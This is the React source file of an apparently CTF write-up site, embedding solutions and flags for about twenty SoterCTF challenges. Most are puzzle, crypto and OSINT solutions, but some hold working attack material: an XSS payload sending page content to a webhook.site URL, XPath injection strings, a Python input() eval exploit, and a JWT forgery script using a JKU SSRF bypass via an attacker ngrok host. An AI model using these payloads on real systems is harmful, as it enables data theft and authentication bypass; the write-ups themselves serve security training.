import React from 'react';
import Header from './components/Header';
import Hero from './components/Hero';
import ChallengeCard from './components/ChallengeCard';
import Footer from './components/Footer';
import { useLanguage } from './i18n/LanguageContext';

const staticChallengeData = [
  { id: 1, points: 300, flag: "SoterCTF{6171776965686A313233}", payload: `import math

# Step 1: Reverse delta encoding
s = 0
c = []
for x in data:
    s += int(x, 0)
    c.append(s)

# Step 2: Rebuild 5-bit compressed bitstream
bits = ''.join(format(v % 32, "05b") for v in c)

# Step 3 & 4: Golomb decoding brute-force over modulus space
for m in range(100, 200, 4):
    decoded = decode(bits, m) # Custom Golomb-like decoding
    if "SoterCTF{" in decoded:
        print(f"Valid modulus found: m = {m}")
        print("Recovered Message:", decoded)
        break

# Output: Here is your flag: SoterCTF{6171776965686A313233} good job!!!` },
  { id: 2, points: 200, flag: "SoterCTF{4a14fd9fb604ba66bbe326c84f0bdbe3}", payload: `# Connect to the vulnerable server
$ nc 173.212.252.46 7340

# --- SoterCTF PalCam Bank Login ---
# When prompted for Username:
Username: admin

# Exploit 1 - Dynamic PIN lookup via Python 2 input() eval:
PIN: users[username]

# Exploit 2 - Reusing the live SHA1 token memory variable:
Token: real_token

# Resulting output:
# Access granted.
# Welcome, admin
# FLAG: SoterCTF{4a14fd9fb604ba66bbe326c84f0bdbe3}` },
  { id: 3, points: 200, flag: "SoterCTF{bc9bffcd87f0608fef824a61b5961e3f}", payload: `# 1. Register a new pilot on the game with the following Username XSS Payload:
<script>
  fetch('https://webhook.site/a74b42b3-e2e3-4eb9-b6a3-6bab9943c859?flag=' + btoa(document.documentElement.innerHTML.match(/SoterCTF{.*?}/)[0]));
</script>

# 2. Play the game and secure a score to appear on /bossboard.php.

# 3. Wait for the admin bot to review /bossboard.php.
# The bot accesses the page from 127.0.0.1:8000 and executes the script.

# 4. A GET request is intercepted at Webhook.site:
# GET /?flag=U290ZXJDVEZ7YmM5YmZmY2Q4N2YwNjA4ZmVmODI0YTYxYjU5NjFlM2Z9
# Referer: http://127.0.0.1:8000/

# 5. Decode the Base64 value from the 'flag' parameter to reveal the plain text:
SoterCTF{bc9bffcd87f0608fef824a61b5961e3f}` },
  { id: 4, points: 200, flag: "SoterCTF{469525900a94cba223d5d3c4e0581b42}", payload: `# Step 1 — Recover key[0] by brute-forcing ASCII constraints
k0_found = 0
for k0 in range(24):
    ascii0 = final_flag[0] - (k0 ** k0)
    if 32 <= ascii0 <= 126:
        print(f"Decoded valid key start: {k0} -> {chr(ascii0)}")
        k0_found = k0

# Step 2 — Reconstruct full deterministic key
key = [(k0_found + i) % 24 for i in range(len(final_flag))]

# Step 3 — Decrypt flag using recovered exponent offsets
flag_chars = []
for i in range(len(final_flag)):
    val = final_flag[i] - pow(key[i], key[-i])
    flag_chars.append(chr(val))

flag = "".join(flag_chars)
print(flag)
# Output: SoterCTF{469525900a94cba223d5d3c4e0581b42}` },
  { id: 5, points: 200, flag: "SoterCTF{Torre_de_Collserola}\nSoterCTF{Turo_de_la_Rovira}\nSoterCTF{Vickers_105_mm}", payload: `# --- OSINT Target: Barcelona, Spain ---

# Flag 1: Distance Mapping
# Visual cross-reference of the skyline needle validates mapping against the Collserola range.
--> SoterCTF{Torre_de_Collserola}

# Flag 2: Hill Geography
# "Bunkers of Carmel" nickname validation resolved into local civic map registry mapping.
--> SoterCTF{Turo_de_la_Rovira}

# Flag 3: Archive Military Hardware
# Blueprint search of republican AA battery (1938) matches the exact requested cannon specifications.
--> SoterCTF{Vickers_105_mm}` },
  { id: 6, points: 150, flag: "SoterCTF{h.kross_69_abq@pollos-nm.com}\nSoterCTF{Madrigal_Electromotive}\nSoterCTF{Dog_House_Drive_In}", payload: `# --- Intelligence Dossier: Heisenberg_Kross69 ---

# Flag 1: Contact
# Mastodon edit history exposes redacted direct communication endpoint.
--> SoterCTF{h.kross_69_abq@pollos-nm.com}

# Flag 2: Corporate Supplier
# Extracting EXIF/metadata from the downloaded industrial filter PDF specs reveals corporate traces.
--> SoterCTF{Madrigal_Electromotive}

# Flag 3: Meetup Geolocation
# IMINT analysis matching neon structures alongside Central Ave correlates to the iconic fast-food location.
--> SoterCTF{Dog_House_Drive_In}` },
  { id: 7, points: 150, flag: "SoterCTF{b4c0fc1b5fbee57a3d11cfe668fcca67}", payload: `# --- Web Exploitation: XPath Injection ---

# Target Endpoint: http://173.212.252.46:7855/search.php
# Vulnerable Parameter: type (POST)

# Step 1: Probe for XPath logic
# Payload: minerals | //*
# Result: Leaks all XML node values.

# Step 2: Target the flag node specifically
# Payload: minerals | //*[contains(text(), 'SoterCTF')]
# Result: SoterCTF{b4c0fc1b5fbee57a3d11cfe668fcca67}` },
  { id: 8, points: 150, flag: "SoterCTF{53ee28c58aa7af4b57720b7d3c508c27}", payload: `import random

alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
output = "+epfFznzIwf/iCXxSXNzFD/memrq8QPEM/EHOmiEAjxq+0si/oOpOTEEHsP"

def unshuffle(s, shuffled):
    return [shuffled.index(c) for c in s]

def try_decode(indices, base):
    n = 0
    for i, d in enumerate(indices):
        n += d * (base ** i)
    bits = bin(n)[2:]
    bits = bits.zfill((len(bits) + 7) // 8 * 8)
    out = bytearray()
    for i in range(0, len(bits), 8):
        out.append(int(bits[i:i+8], 2))
    try:
        return out.decode()
    except:
        return None

# Brute force bases 10-60
for base in range(10, 61):
    random.seed(base * len(alphabet))
    shuffled = ''.join(random.sample(alphabet, len(alphabet)))
    try:
        indices = unshuffle(output, shuffled)
        flag = try_decode(indices, base)
        if flag and flag.startswith("SoterCTF{"):
            print(f"Base Found: {base} | Flag: {flag}")
            break
    except ValueError:
        continue` },
  { id: 9, points: 100, flag: "SoterCTF{España}\nSoterCTF{Castillo_Sant_Marçal}\nSoterCTF{Familia_Trénor}\nSoterCTF{matauira_chin_ah_you}", payload: `# --- OSINT Target: Aerial Forensics ---

# Stage 1: Landmark Cross-Reference
# Visual cues correlate structural towers to the Sant Marçal estate (Catalonia).
--> SoterCTF{España}
--> SoterCTF{Castillo_Sant_Marçal}

# Stage 2: Historical Ownership
# Genealogical research of the Marimón lineage to present day stewardship.
--> SoterCTF{Familia_Trénor}

# Stage 3: Attribution
# Inspecting satellite panorama metadata for original contributor handle.
--> SoterCTF{matauira_chin_ah_you}` },
  { id: 10, points: 100, flag: "SoterCTF{h3ll0_fRo0oM_th3_m00n!}", payload: `# --- Steganography: SSTV Audio Decoding ---

# Signal Identification:
# Waveform analysis in Audacity reveals characteristic tone patterns 
# found in Slow Scan Television (SSTV) transmissions.

# Tools: RX-SSTV, QSSTV, or Audacity (Spectrogram)
# Method: 
# 1. Load original audio file into SSTV decoder.
# 2. Select Auto-detect mode for Robot/Scottie/Martin formats.
# 3. Allow real-time image reconstruction from audio tones.

--> Resulting visual: A logo overlay with the flag string.` },
  { id: 11, points: 100, flag: "SoterCTF{158}", payload: `from collections import deque

def solve_pathfinder(data):
    grid = data['grid']
    start = tuple(data['start'])
    end = tuple(data['end'])
    rows, cols = len(grid), len(grid[0])
    
    queue = deque([(start, 0)])
    visited = {start}
    
    while queue:
        (r, c), dist = queue.popleft()
        
        if (r, c) == end:
            return dist
            
        for dr, dc in [(0, 1), (0, -1), (1, 0), (-1, 0)]:
            nr, nc = r + dr, c + dc
            if 0 <= nr < rows and 0 <= nc < cols and \
               grid[nr][nc] == '.' and (nr, nc) not in visited:
                visited.add((nr, nc))
                queue.append(((nr, nc), dist + 1))
    return -1

# Result: SoterCTF{158}` },
  { id: 12, points: 100, flag: "SoterCTF{7954879fb82686cebd9ad7c2c3ee8ce0}", payload: `import hashlib
from itertools import permutations

def generate_latin_squares(n):
    all_rows = list(permutations(range(1, n+1)))
    squares = []
    def backtrack(current):
        if len(current) == n:
            squares.append(''.join(''.join(map(str, row)) for row in current))
            return
        for row in all_rows:
            if all(row[i] not in [r[i] for r in current] for i in range(n)):
                current.append(row)
                backtrack(current)
                current.pop()
    backtrack([])
    return squares

# Execution Pipeline
squares = generate_latin_squares(5)
squares.sort() # Critical step
mega_string = ''.join(squares)
result = hashlib.md5(mega_string.encode()).hexdigest()

print(f"MD5: {result}")
# Flag: SoterCTF{7954879fb82686cebd9ad7c2c3ee8ce0}` },
  { id: 13, points: 100, flag: "SoterCTF{5f805477c1a1f2ec689efeb95bfa56ea}", payload: `import hashlib
from itertools import permutations

def is_valid(perm):
    for i in range(8):
        for j in range(i + 1, 8):
            # Check diagonals
            if abs(perm[i] - perm[j]) == abs(i - j):
                return False
    return True

# Generate and serialize all 92 valid solutions
solutions = []
for perm in permutations(range(8)):
    if is_valid(perm):
        solutions.append(''.join(map(str, perm)))

solutions.sort()
mega_string = ''.join(solutions)
result = hashlib.md5(mega_string.encode()).hexdigest()

print(f"MD5: {result}")
# Flag: SoterCTF{5f805477c1a1f2ec689efeb95bfa56ea}` },
  { id: 14, points: 100, flag: "SoterCTF{530477}", payload: `import math

def count_twin_primes(limit):
    sqrt_limit = int(math.isqrt(limit)) + 1
    # Small primes up to sqrt(N)
    is_prime_small = [True] * (sqrt_limit + 1)
    is_prime_small[0:2] = [False, False]
    for i in range(2, int(sqrt_limit**0.5) + 1):
        if is_prime_small[i]:
            for j in range(i*i, sqrt_limit + 1, i):
                is_prime_small[j] = False
    small_primes = [i for i, v in enumerate(is_prime_small) if v]

    # Segmented Sieve
    segment_size = 10**6
    twin_count = 0
    prev_prime = 2
    for low in range(2, limit + 1, segment_size):
        high = min(low + segment_size - 1, limit)
        is_prime = [True] * (high - low + 1)
        for p in small_primes:
            # First multiple of p in range [low, high]
            start = max(p * p, ((low + p - 1) // p) * p)
            for j in range(start, high + 1, p):
                is_prime[j - low] = False
        for i in range(max(low, 2), high + 1):
            if is_prime[i - low]:
                if i - prev_prime == 2:
                    twin_count += 1
                prev_prime = i
    return twin_count

# Result for 123,456,789
# Flag: SoterCTF{530477}` },
  { id: 15, points: 100, flag: "SoterCTF{fc0a143ff035763e07bf123813915733}", payload: `# --- Reverse Engineering: Static Binary Extraction ---

# Step 1: Inspect .rodata section for hidden strings
$ objdump -s main | grep -A 20 ".rodata"

# Observation: The flag is stored as 32-bit little-endian integers
# (Each char followed by three null bytes 0x00)

# Step 2: Reconstruction script (Python)
hex_data = [
    0x53, 0x6f, 0x74, 0x65, 0x72, 0x43, 0x54, 0x46, 0x7b, # SoterCTF{
    0x66, 0x63, 0x30, 0x61, 0x31, 0x34, 0x33, 0x66, 0x66,
    0x30, 0x33, 0x35, 0x37, 0x36, 0x33, 0x65, 0x30, 0x37,
    0x62, 0x66, 0x31, 0x32, 0x33, 0x38, 0x31, 0x33, 0x39,
    0x31, 0x35, 0x37, 0x33, 0x33, 0x7d
]

print("".join(chr(x) for x in hex_data))
# Result: SoterCTF{fc0a143ff035763e07bf123813915733}` },
  { id: 16, points: 100, flag: "SoterCTF{ad3f2da471766134a2430af75ecd0e15}", payload: `# --- Forensic Analysis: Document Recovery ---

# Target: Google Doc with "cropped" image
# URL: https://docs.google.com/document/d/10VazuyurTIRHMlDThq3JKsbLCRfAa99E/edit

# Technique A: Alternative Rendering Endpoint
# 1. Modify the URL to use the 'mobilebasic' view mode:
# https://docs.google.com/document/d/10VazuyurTIRHMlDThq3JKsbLCRfAa99E/mobilebasic

# Technique B: Disable Client-Side Scripting
# 1. Disable JavaScript in browser settings.
# 2. Force the doc to render in basic static HTML.

# Result:
# The image container fails to enforce non-destructive cropping boundaries,
# revealing the original screenshot in its entirety.

--> Decoded Flag Found: SoterCTF{ad3f2da471766134a2430af75ecd0e15}` },
  { id: 17, points: 50, flag: "SoterCTF{Lluís_Domènech_i_Montaner}", payload: `# --- OSINT: Visual Pattern Recognition ---

# Target: Distorted ("deep fried") landmark image
# Clue: Architectural style survives noise.

# Step 1: Stylistic Profiling
# - Red brick architecture
# - Ornamental ceramics 
# - Gothic-Modernist arches
# --> Profile: Catalan Modernisme (Barcelona style)

# Step 2: Reverse Image Search
# Tool: Google Lens
# High match despite filters: Hospital de Sant Pau (Barcelona)

# Step 3: Attribution
# Architect: Lluís Domènech i Montaner

--> Flag: SoterCTF{Lluís_Domènech_i_Montaner}` },
  { id: 18, points: 10, flag: "SoterCTF{978098044c1848bb5e6fe02f5af0d672}", payload: "https://discord.gg/qfvhzhxTW9" },
  { id: 20, points: 500, flag: "SoterCTF{ff12d12b60b168f6c7ac122c9bf2f5ba}", url: "https://kore.one/", payload: `# --- Malware Analysis: Soter Engineering Team ---
# Original Writeup: https://kore.one/

import base64
from Crypto.Cipher import AES

# 1. VBA macro emulation: extract base64 + apply fSx6 bit permutation 
# 2. AES-192-CFB8 Decrypt payload:
# Key: F0r3Ms1$c$s4r3C00l!!!  (Padded to 24 bytes)
# IV: sotersoter\xbbsoter

cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=8)
dec = cipher.decrypt(ct)

# 3. Important: The decrypted PowerShell bytes must be reversed.
ps_inner = dec[::-1].decode('latin-1')

# 4. Final Cleanup: Substitute remaining string tokens
# ('65c','$'), ('LmU','"'), ('P30',"'"), ('GzX','\`'), ('y0C','|'), ('uB0','\\\\')

# 5. Extract C2 Bot token and query Telegram API for recently forwarded stickers.
# 6. Assemble flag visually from sticker WebP overlays.
# Flag: SoterCTF{ff12d12b60b168f6c7ac122c9bf2f5ba}` },
  { id: 21, points: 300, flag: "SoterCTF{1fb24985e208058b28c708b2fe4ac251}", payload: `# --- Web Exploitation: JKU Injection + PHP Type Juggling ---
# Target: http://173.212.252.46:1911/private-area
# Original Writeup: https://kore.one/

import json, base64, requests, time
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

# 1. Attacker generates RSA-2048 keypair locally and serves JWKS.json 
#    via ngrok tunnel at NGROK_HOST. Let's assume the local key is prepared.
with open('/tmp/private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(f.read(), None, default_backend())

# 2. SSRF Bypass matching strpos('http://127.0.0.1') via Userinfo Auth
JKU_URL = f"http://127.0.0.1@ATTACKER.ngrok-free.dev/jwks.json"

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    elif isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt(payload):
    header = {"typ": "JWT", "alg": "RS256", "jku": JKU_URL, "kid": "k1"}
    signing_input = f"{b64url(header)}.{b64url(payload)}".encode()
    sig = private_key.sign(signing_input, asym_padding.PKCS1v15(), hashes.SHA256())
    return f"{signing_input.decode()}.{b64url(sig)}"

# 3. PHP 7.x loosely compares 0 == "admin" as True
malicious_payload = {
    "sub": "1",
    "usr": 0,    # Trigger PHP 7.4 Type Juggling
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

token = forge_jwt(malicious_payload)

# 4. Fetch the flag from the /private-area
r = requests.get(
    "http://173.212.252.46:1911/private-area", 
    headers={"Authorization": f"Bearer {token}"}
)

print(r.text)
# Output: {"code":"SoterCTF{1fb24985e208058b28c708b2fe4ac251}"}` },
  { id: 19, points: 150, flag: "SoterCTF{D3fen5E_s1ST3m_dI55aBled}", payload: `import base64

encoded_flag = "U290ZXJDVEZ7RDNmZW41RV9zMVNUM21fZEk1NWFCbGVkfQ=="

# Decode base64 to plain text
decoded = base64.b64decode(encoded_flag).decode('utf-8')

print("Decoded Base64:", decoded)
# Decoded Base64: SoterCTF{D3fen5E_s1ST3m_dI55aBled}` }
];

function App() {
  const { t } = useLanguage();
  
  // Merge translated data with static payload/flag data
  const localizedData = t('challengeData') || [];
  const fullChallengeData = localizedData.map(challenge => {
    const staticInfo = staticChallengeData.find(s => s.id === challenge.id);
    return { ...challenge, ...staticInfo };
  }).sort((a, b) => b.points - a.points);
  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      
      <main className="container flex-grow" style={{ maxWidth: '800px', width: '100%' }}>
        <Hero />
        
        <div id="writeups" className="animate-fade-in" style={{ animationDelay: '400ms', animationFillMode: 'both' }}>
          <h2 style={{ fontSize: '2rem', marginBottom: '2rem', color: 'var(--text-main)', borderBottom: '1px solid var(--border-color)', paddingBottom: '0.5rem' }}>
            {t('featured')}
          </h2>
          
          <div className="flex flex-col gap-4">
            {fullChallengeData.map((challenge) => (
              <ChallengeCard
                key={challenge.id}
                category={challenge.category}
                name={challenge.name}
                points={challenge.points}
                description={challenge.description}
                resolution={challenge.resolution}
                flag={challenge.flag}
                payload={challenge.payload}
              />
            ))}
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}

export default App;
